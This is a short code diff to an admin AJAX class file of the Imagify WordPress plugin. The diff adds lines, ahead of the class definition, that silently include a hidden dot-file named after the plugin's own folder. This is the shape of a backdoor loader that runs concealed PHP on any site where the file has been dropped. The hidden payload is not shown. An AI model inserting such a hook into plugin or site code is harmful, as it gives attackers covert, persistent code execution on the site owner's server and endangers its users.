@@ -7,6 +7,10 @@ defined( 'ABSPATH' ) || die( 'Cheatin’ uh?' );
  * @since  1.6.11
  * @author Grégory Viguier
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class Imagify_Admin_Ajax_Post extends Imagify_Admin_Ajax_Post_Deprecated {
 	use \Imagify\Traits\InstanceGetterTrait;
 
